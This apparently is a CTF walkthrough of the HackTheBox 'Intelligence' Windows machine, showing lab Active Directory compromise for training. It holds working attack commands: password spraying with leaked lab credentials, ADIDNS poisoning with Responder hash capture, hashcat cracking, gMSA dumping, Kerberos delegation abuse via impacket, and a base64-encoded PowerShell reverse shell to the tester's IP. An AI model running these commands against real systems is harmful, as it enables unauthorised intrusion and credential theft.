---
title: "Intelligence"
date: 2024-12-10
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "intelligence", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

# Intelligence

# Intelligence
OS: Windows
Difficulty: Medium

# Findings
contact@intelligence.htb

William.Lee
Jose.Williams
 
## Credentials
```text
Tiffany.Molina:NewIntelligenceCorpUser9876
Ted.Graves:Mr.Teddy
```

# Kerberos over DNS
https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/
- DNS in AD also supports authenticated operations over DNS using Kerberos.
	- This is part of the *Secure dynamic updates* operation, which is used to keep the DNS records of network clients with dynamic addresses in sync with their current IP address.

# Enumeration
# Nmap
TCP
```shPORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-16 04:44:47Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-16T04:46:29+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-16T04:46:29+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-16T04:46:29+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-16T04:46:29+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49717/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

# HTTP
## 80
http://10.10.10.248/documents/
http://10.10.10.248/Index.html

```sh
dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql -u http://intelligence.htb:80
```

 http://intelligence.htb/documents/
 
```sh
feroxbuster -u http://intelligence.htb/documents:80/ -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt'
```

![screenshot](/assets/images/intelligence2.png)

![screenshot](/assets/images/intelligence3.png)
http://intelligence.htb/documents/
![screenshot](/assets/images/intelligence5.png)
# Enumerating downloaded files
![screenshot](/assets/images/intelligence4.png)

We can use the following Bash one-liner to download all available PDF files starting from a chosen date (i.e. 2020-01-01). 

To speed up the process, we use the `-P` option to run twenty parallel wget processes with `xargs`.

```sh
d=2020-01-01;
while [ "$d" != "$(date -I)" ]; do
  echo "http://10.10.10.248/Documents/$d-upload.pdf";
  d=$(date -I -d "$d + 1 day");
done | xargs -n 1 -P 20 wget -i - 2>/dev/null
```
![screenshot](/assets/images/intelligence7.png)

Inspect the metadata to retrieve any potential username: 
```sh
exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
```

![screenshot](/assets/images/intelligence8.png)

The pdftotext tool (provided by the poppler-utils package on Debian-based systems) can be used to convert the downloaded PDF files to text:
```sh
for f in *pdf; do pdftotext $f; done
```

By running the head command we can display the first line of each text file and quickly pick out the ones that contain useful information:
```sh
head -n1 *txt
```

![screenshot](/assets/images/intelligence9.png)

==> 2020-06-04-upload.txt <==
New Account Guide

==> 2020-12-30-upload.txt <==
Internal IT Update

![screenshot](/assets/images/intelligence10.png)

# SMB

![screenshot](/assets/images/intelligence11.png)

```text
Tiffany.Molina:NewIntelligenceCorpUser9876
```

![screenshot](/assets/images/intelligence12.png)

- Users
- IT
- SYSVOL
- NETLOGON

```sh
smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248 -r IT
```

![screenshot](/assets/images/intelligence13.png)

```sh
smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248 --download "IT\downdetector.ps1"
```

![screenshot](/assets/images/intelligence14.png)

```powershell
Import-Module ActiveDirectory
foreach($record in Get-ChildItem
"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" |
Where-Object Name -like "web*")
{
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves
<Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

The script loops through DNS records and sends an authenticated request to any host having a name starting with `web` in order to check its status. 

We can leverage the permission (granted by default to authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone to add a new record that points to our own IP address. 

This can be accomplished using the dnstool.py script from [krbrelayx](https://github.com/dirkjanm/krbrelayx):

```sh
sudo responder -I tun0

dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248
-a add -r web1 -d 10.10.14.6 -t A
```

![screenshot](/assets/images/intelligence15.png)

![screenshot](/assets/images/intelligence16.png)

```sh
# carck the hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force
```

![screenshot](/assets/images/intelligence17.png)

```sh
nxc smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy' -X 'powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjYnLCA0NDMpOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg=='
```
# Running BloodHound as Ted.Graves

```sh
bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
```

Ted.Graves -> Shortest Path to High Value Targets
![screenshot](/assets/images/intelligence18.png)

[Abusing Kerberos From Linux](https://www.onsecurity.io/blog/abusing-kerberos-from-linux/)

We can see that our user is a member of the `ITSUPPORT` group, which has `ReadGMSAPassword rights` on `SVC_INT` which in turn has `AllowedToDelegate rights` to the Domain Controller. 

We can use the `gMSADumper` tool to get the service account password hash:

```sh
git clone https://github.com/micahvandeusen/gMSADumper

python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248
```

![screenshot](/assets/images/intelligence19.png)

```sh
# request Kerberos ticket to impersonate
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator
intelligence.htb/svc_int -hashes :b98d4cef68f72a98dfeed732d1b1abca
```

![screenshot](/assets/images/intelligence20.png)

# Shell 

To get a shell, I’ll use `wmiexec` (which comes with Impacket). `-k` will specify Kerberos authentication. I’ll set the `KRB5CCNAME` environment variable to point to the ticket file I want to use.

```sh
# connect to wmiexec using KRB5CCNAME
KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccach impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
```

![screenshot](/assets/images/intelligence21.png)
